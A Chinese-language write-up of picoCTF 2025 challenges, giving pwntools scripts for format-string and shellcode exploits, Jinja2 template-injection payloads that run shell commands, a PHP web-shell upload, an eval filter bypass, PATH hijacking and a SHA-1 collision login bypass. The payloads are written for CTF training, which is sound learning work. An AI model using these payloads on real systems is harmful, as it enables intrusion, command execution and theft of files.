---
title: picoCTF2025
published: 2025-10-20
description: picoCTF2025 Writeup
tags: [CTF]
category: Learning
draft: true
---
## Binary
### PIE TIME 2
`%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`利用這段取得呼叫`call_functions`的下一句
這樣就能獲得偏移基址，就能呼叫`win`了

### Echo Valley
先用`%p`找到return address
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2efcd7ef58bfddd3cfd121553797fb8c.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948591&Signature=opX06FlxtUjRmlh8WO3AklRN4cc%3D)

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_efb4e127eba593f816a6e9f00cf0f78d.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948624&Signature=C1qU7d5dNfAd6zlVZCXBv0ckWTU%3D)

找到return address後的上一個就是rbp，rbp-8就可以獲得存return address的位置

利用return address來計算print flag函數的位址，因為這題會隨機化

這題是從stack的第6個位置開始寫入，知道這些後就可以使用`fmtstr_payload`來在任意位置寫入
注意一次只寫入2 bytes


```python
from pwn import *

#p = process("./valley")
p = remote("shape-facility.picoctf.net", 50579)

context.arch = 'AMD64'

print(p.recvline().decode('utf-8'))
p.sendline(b'%20$p.%21$p')

return_addr = int(p.recvuntil(b'.')[-15:-1], 16) - 8
main_addr = int(p.recvuntil(b'\n')[-15:-1], 16)
printflag_addr = main_addr - 0x1aa

chunks = [
    printflag_addr & 0xFFFF,
    (printflag_addr >> 16) & 0xFFFF,
    (printflag_addr >> 32) & 0xFFFF
]

p.sendline(fmtstr_payload(6, {return_addr: chunks[0]}))
p.sendline(fmtstr_payload(6, {return_addr + 2: chunks[1]}))
p.sendline(fmtstr_payload(6, {return_addr + 4: chunks[2]}))


p.sendline(b'exit')

p.interactive()

```

### hash-only-1

這題會對flag進行md5 hash，注意到他是使用命令行呼叫`md5sum`，因此可以劫持，複製一個`cat`並改成`md5sum`即可騙過他
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_7d0e6886fce6417ae16bcd53786e1261.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948805&Signature=8uT0C95je8ZZ9swhPgDByBRp604%3D)

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_8384501fb40ecc3552bb02b50305ce15.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948811&Signature=QW8BmdRf4M9SbHuIKc8A5aovlP0%3D)

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_1d92324148b8c4cf24a03169b662063e.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948817&Signature=HCQoG9AUfbO4Lih%2FE8dYA9N0LbM%3D)
記得修改環境PATH，優先抓當前目錄

### hash-only-2
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_9abfc168e2b4af1c32095341df25c64a.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948823&Signature=q84LxdzScU5tDJkycOZI76fZGJg%3D)

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_ac22b94d7328a4061ad049df5c8ec0e3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948828&Signature=2WzNwXjfvDsw7BuUnbU1DIoOkGI%3D)

用一樣的方式發現被限制了，因為當前環境是`rbash`，是被受限制的bash
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_dbdeb11edfd05794cb14b75b2fab0eca.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948835&Signature=BZlmlAXiUHyMw0ZwbMEhZDhKOM0%3D)

只要切換成`sh`就沒事了
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_08c40dae19f7d8a2625843e4b42e9a6b.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948841&Signature=Vtg0PLl9ILhbwTu9vBEGhMrMVGc%3D)

### handoff
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_61374a93ac64674984a22c503ec0d574.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948847&Signature=3ijwjuCAAhhclXOO5vrOaIQk3Bs%3D)
先檢查發現發現stack可執行，且這題沒有提供讀flag的函數，估計是要注入shellcode來啟動shell

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_64b143e1639dd495bbfa74687faa6ad1.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948853&Signature=GHe7P0NuXGYnakHWP6fYE%2Fo%2B%2BWk%3D)
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_0d992f5195820b630d74271dfb17514f.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948859&Signature=FwzE7kch%2FkinuLjFgXD%2BiUIZQxc%3D)
這段可以overflow到return address，但長度不長，而且因為ASLR，我們也不知道shellcode被放置的正確位置

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_5b9daef3072274fe9b64f8d4357b1568.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948864&Signature=BNqC7gUBy%2FyPvoo%2BOdMpJkY8AeA%3D)
可以把shellocde放到題目提供的entries，他在stack上，且與rsp的距離固定
return addr - entries[0]：
`0x7fffffffdcd8 - 0x7fffffffd9f0 = 0x2e8`


接著要想辦法跳過去entries，發現在ret時的`rax`存的是最後在輸入時的buf的起始位置，能利用gadget跳到rax所存的位置，這裡可以注入shellcode來跳到entries
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_7d73994d9f2ae4cf24945b7f03cf51f2.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948871&Signature=%2BM%2FC6%2BTrN2wzLHvNlxXVN3GdK5I%3D)
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_b29c993b1635660e4bff01d686ca04b9.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948876&Signature=uQXkbqCQnqr7WiW%2FAM39pXCki9c%3D)
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_9f80466371bd64063a40ae64d81949cd.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948881&Signature=qOLoTxfiJJkDMzGJjxJeZhMPAoI%3D)
> payload長這樣

```python
from pwn import *

#p = process("./handoff")
p = remote("shape-facility.picoctf.net", 58768)

context.arch = 'AMD64'

print(p.recvline().decode('utf-8'))
print(p.recvuntil(b'Exit the app\n').decode('utf-8'))

p.sendline(b'1')
print(p.recvline())
p.sendline(b'shellcode')

print(p.recvuntil(b'Exit the app\n').decode('utf-8'))
p.sendline(b'2')
print(p.recvline())
p.sendline(b'0')

shellcode = asm(shellcraft.sh())

print(p.recvline())
p.sendline(shellcode)

print(p.recvuntil(b'Exit the app\n').decode('utf-8'))

p.sendline(b'3')
print(p.recvline())

payload = asm('nop; sub rsp, 0x2e8; jmp rsp')
payload += asm('nop') * 10
jmp_rax = 0x40116c
payload += p64(jmp_rax)
p.sendline(payload)
p.interactive()
```


## Reverse
### Flag Hunters
`;RETURN 0`利用`;`分割，形成一個單獨的指令，讓其可以回到最前面的指令


### Tap into Hash
這題是利用區塊鍊加密
```python
def encrypt(plaintext, inner_txt, key):
    midpoint = len(plaintext) // 2

    first_part = plaintext[:midpoint]
    second_part = plaintext[midpoint:]
    modified_plaintext = first_part + inner_txt + second_part
    block_size = 16
    plaintext = pad(modified_plaintext, block_size)
    key_hash = hashlib.sha256(key).digest()

    ciphertext = b''

    for i in range(0, len(plaintext), block_size):
        block = plaintext[i:i + block_size]
        cipher_block = xor_bytes(block, key_hash)
        ciphertext += cipher_block

    return ciphertext
```

以下是反過來推演的解密函數
```python
def decrypt(encryption_blockchain, key):
    key_hash = hashlib.sha256(key).digest()
    block_size = 16
    plaintext = b''

    for i in range(0, len(encryption_blockchain), block_size):
        block = encryption_blockchain[i:i + block_size]
        decrypted_block = xor_bytes(block, key_hash)
        plaintext += decrypted_block
    # 去掉填充，最後一個字節是填充的數量
    padding_length = plaintext[-1]
    plaintext = plaintext[:-padding_length]

    decrypted_text = plaintext.decode('utf-8')
    print("Decrypted Blockchain:", decrypted_text)
    # 由於原始區塊鏈字串格式為 hash1-hash2-hash3...
    # 且 token 被插入在中間，我們可以找出不符合這個模式的部分
    parts = decrypted_text.split('-')
    for i, part in enumerate(parts):
        # 因為SHA256的雜湊值是64位元，所以要找不是的就會是特殊項
        return part
    return None
```

### Binary Instrumentation 1
這題先嘗試執行
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_be44e4d9339694cf4b440bea02db8887.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948901&Signature=HdZUoHfYTpVNnYkjXSDelwGgo5I%3D)
發現會被卡住，看起來是呼叫Sleep之類的

題目有提示可以使用frida
1. Frida 是一個動態二進位插桿（dynamic instrumentation）工具，可以在程式執行時注入自訂程式碼（通常用 JavaScript），去監聽、攔截、修改或觀察目標程式的行為
2. hook（攔截）原生或高階語言函式（C/C++、Windows API、POSIX、Java、Objective-C 等）

使用`frida-trace`可以去查找指定的function並生成對應攔截器
`frida-trace -i Sleep -f bininst1.exe`
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_494ef9a1d380959d1e86c3f0697e30b8.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948907&Signature=hfosKKUdnppGpPmeEVcLS7LQwow%3D)
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_4e4f6ec639ffa0e1465065818c1f91e3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760948913&Signature=6M3OubYR2oO%2BV5f%2Bj%2FrCb7fHpkM%3D)



因此嘗試去hook Sleep
```javascript
var sleep = Module.findExportByName("kernel32.dll", "Sleep")

Interceptor.replace(sleep, new NativeCallback(function(ms) {
	return // don't sleep
}, "void", ["uint32"]))
```
這段程式碼可以跳過Sleep

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_3a095f8238f30db41aa13716db816bd3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949242&Signature=G0JTnbmnltbAsd9PbtY%2B0WbO0xc%3D)


### Binary Instrumentation 2

`frida-trace -f bininst2.exe -i "*"`會把全部的handlers都新增
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_e4027928499b242783b6d1c184f9da43.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949252&Signature=BVqhRlQ02K8r5y3uPpMLCmzlx1w%3D)

`frida-trace -i *File* -f bininst2.exe -X KERNEL32` 利用這個方式可以指定名稱裡面有`File`的，因為題目有提到有檔案寫入
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_04cd7d0bfb7d37272b54cf961f0fd647.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949258&Signature=IP4exWq1N1oLxeVnYR9OvkOP%2FXU%3D)
> 發現有createFileA

```javascript
  onEnter(log, args, state) {
    // log('CreateFileA()');
    // Log the filename being created
    state.filename = Memory.readUtf8String(args[0]);
    log('CreateFileA called with filename: "' + state.filename + '"');
  },
```
> 嘗試hook CreateFileA

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2e0753df39587a7c1c4a47e57b5903ea.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949266&Signature=uubNd889Cmvpxcfu5NWQAXsSEss%3D)
> 發現檔案創建失敗

推斷是創檔案的路徑題目故意用無法使用的名稱，再次修改hook，指定一個正確的路徑
```javascript
state.originalPath = Memory.readUtf8String(args[0]);
log('CreateFileA - Original path: "' + state.originalPath + '"');

// Replace the invalid path with a valid one
const newPath = Memory.allocUtf8String('flag.txt');
args[0] = newPath;

// Save reference to prevent garbage collection
state.newPath = newPath;

log('CreateFileA - Replaced with: "flag.txt"');
```

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_81c8784dc5e5c79c35de9e4a7305a9ac.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949506&Signature=IaZ7DjoLaweKItjwV%2B25rbhxscU%3D)
> 成功創建`flag.txt`

打開`flag.txt`發現裡面是空的，推測寫入時也有問題，去找WriteFile
```javascript
// Log basic info
log('WriteFile called with handle: ' + args[0]);
log('WriteFile buffer content:');
log(hexdump(args[1]));
```
> args[0]是寫入的檔案，args[1]是寫入的檔案內容
>
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_a7d90890f29ca9edf3728fe9f7165e1b.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949518&Signature=I%2Bk5h%2BcfI5q5MuadBESfXMSNjZA%3D)


## Web
### SSTI1
模板注入
先測試這是什麼模板 `{{7*7}}`有反應
可能是python的Jinja2
使用`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`查看當前檔案目錄

`{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}`取得flag

config是Jinja2(Flask的一個套件)的配置物件app.confing的實例

`config.__class__`是`<class 'flask.config.Config'>`

`config.__class__.__init__.__globals__`有一個`'os': <module 'os' from '/usr/lib/python3.8/os.py'>,`，所以可以藉此取得os

`.read()`的作用是將前面的`popen('cat flag')`輸出出來

---
`{{ "".__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']("ls").read() }}`
其他取得os的辦法，但`132`這個值要自己找出來

### SSTI2
`.`被過濾了，改成使用`|attr`
`{{config.__class__}}`改成`{{config|attr("__class__")}}`

`_` 也被過濾了，改成使用Hex Encoding`\x5f`
變成`{{config|attr("\x5f\x5fclass\x5f\x5f")}}`

`|attr('get')('os')`可以替代`['os']`，因為`[]`被過濾了

`|attr('popen')('ls')`取代`.popen('ls')`

`|attr('read')()`取代`.read()`

`{{config|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr('get')('os')|attr('popen')('ls')|attr('read')()}}`
最終可以執行任何指令的payload

### n0s4n1ty 1

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_cfb34110fa445286d6ed82f19000726f.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949533&Signature=cNIsuJxiRLXi9wLd3n55dMRzBXc%3D)
此網站提供上傳圖片的功能，上傳圖片後抓包看看

直接改成php腳本測試
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_401eb2138eddad3b5d93288e2f456a31.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949538&Signature=t3tG0Svm6BM0zko%2Fjed7uV3r6vM%3D)


![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_4c8659bdabcbb8343cb462661a821268.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949543&Signature=wVY7BGzKyr4MLBDTU7%2FIXqWw9aQ%3D)
發現圖片被放在某個位置，直接去這個位置查看php腳本是否生效

`<?php system('ls')?>`找檔案

`可以使用sudo -l`來確認當前權限
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_91a1c09dd750413d1ba89ec9efabce6b.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949551&Signature=oLGq76o6Kcclg%2FJgYVaDS72UCvg%3D)
這段表示你會以www-data的身分登入，且不需使用密碼即可使用`sudo`指令

`<?php system('sudo cat /root/flag.txt')?>`取得flag

### head-dump
查看網頁源碼，發現有個api文件
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_a99d568f18a655145353af68c6f77c92.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949557&Signature=OXde3uGY7ee%2B%2F24XgLcJn4Dq9aU%3D)
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_fc9086150066bed9fc93fc1ce0a99ff3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949562&Signature=aWGyjgSO8yWKYmB7jCHy9krV4fk%3D)
使用`/heapdump`可以獲得網頁的heap狀態快照

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_4c51c270bef6e9b4e4f9fa6b7963933c.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949579&Signature=3XFQMaZFKUOtqFOTkyEka4p9Ucw%3D)
> flag就藏在快照裡

### 3v@l
這題有一個輸入框可以用來計算，依題目的意思應該是使用`eval`
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_20dd7e4e4252256b40c9022892caa69e.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949585&Signature=bgqLAjw87r%2BQ4QcOLAO9GwlTolM%3D)

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_a660015d43bba831f1f5fb22030e281a.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949593&Signature=0C2qCAnbleu4qwoi3nZXFTqxkHc%3D)
> 查看原始碼，發現有限制規定

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_db51d8dd99604515ac62656f41de8b51.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949600&Signature=Uz5A%2FdthrhT%2BjMsj0Eq3uKVxx08%3D)
> 這些事regex過濾的

要搭建出`open("/flag.txt").read()`
但`/`被過濾了，可以使用`chr(47)`代替
`.txt`的這個副檔名也被過濾，使用`+`來做串接
最終得到`open(chr(47) + "flag" + "." + "txt").read()`

### Apriti sesamo
這題是個登入頁面，提示說到backup file和開發者是使用emacs
而emacs在編輯文件時會自己創建備份檔案，其名稱為`原檔名 + ~`
而開發者可能會不小心也將備份檔案也一併，因此在url後方加上~，發現多出一段註解
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_aae47e36ec3dce090eceb6f6df454c74.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1760949607&Signature=4dzrSxTDkXXKvgWUVtMOvIPK9H8%3D)

```python
if ($_POST['username'] == $_POST['pwd']) {
    echo "Failed! Even values must match.";
}
else if (sha1($_POST['username']) === sha1($_POST['pwd'])) {
    echo file_get_contents("../flag{...}");
}
else {
    echo "Failed! Even values must match.";
}
```
所以username和pwd的部分要填入不同的值，但其sha1是一樣的，這就用到sh1 collision attack，而有兩份pdf是有相同的sha1，並用其內容作為username和pwd

```python
import requests
import urllib.request

pdf1 = urllib.request.urlopen("https://shattered.io/static/shattered-1.pdf").read()[:500]
pdf2 = urllib.request.urlopen("https://shattered.io/static/shattered-2.pdf").read()[:500]

r = requests.post('http://verbal-sleep.picoctf.net:56577/impossibleLogin.php',
                  data = {'username': pdf1, 'pwd' : pdf2})

print(r.text)
```